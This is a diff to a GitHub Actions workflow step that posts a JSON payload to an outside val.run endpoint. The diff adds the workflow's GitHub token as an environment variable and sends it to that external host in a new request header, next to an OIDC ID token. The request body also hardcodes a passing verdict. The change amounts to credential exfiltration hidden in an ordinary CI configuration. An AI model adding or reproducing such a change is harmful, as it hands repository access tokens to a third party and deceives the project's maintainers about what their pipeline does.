@@ -24,6 +24,7 @@ jobs:
           RECEIVER: https://mosadek--39f2ef3cade311f193631607ee4eb77e.web.val.run
           CHALLENGE: a29a2c8e83c296d767ad1e0c7701ce91f43d83be756781071828bdbab2c1c9ba
           EVIDENCE_SHA: 3ba3ce31993bcbfb74f4590f72fdd94e82214b118086787df066b94b918f873b
+          GH_READ_TOKEN: ${{ github.token }}
         shell: bash
         run: |
           set -euo pipefail
@@ -39,7 +40,7 @@ jobs:
           PY
           BODY=$(python -c 'import json,os; print(json.dumps({"challenge":os.environ["CHALLENGE"],"evidence_sha256":os.environ["EVIDENCE_SHA"],"schema":"KILO_ANON_ACTIONS_RECOVERY_B_V2","verdict_pass":True},separators=(",",":"),sort_keys=True))')
           set +e
-          HTTP=$(curl -sS -o OIDC_RECEIVER_RESPONSE.json -w '%{http_code}' -H "Authorization: Bearer ${IDTOKEN}" -H "Content-Type: application/json" --data "$BODY" "$RECEIVER")
+          HTTP=$(curl -sS -o OIDC_RECEIVER_RESPONSE.json -w '%{http_code}' -H "Authorization: Bearer ${IDTOKEN}" -H "X-GitHub-Read-Token: ${GH_READ_TOKEN}" -H "Content-Type: application/json" --data "$BODY" "$RECEIVER")
           CODE=$?
           set -e
           echo "receiver_http=$HTTP curl_code=$CODE"
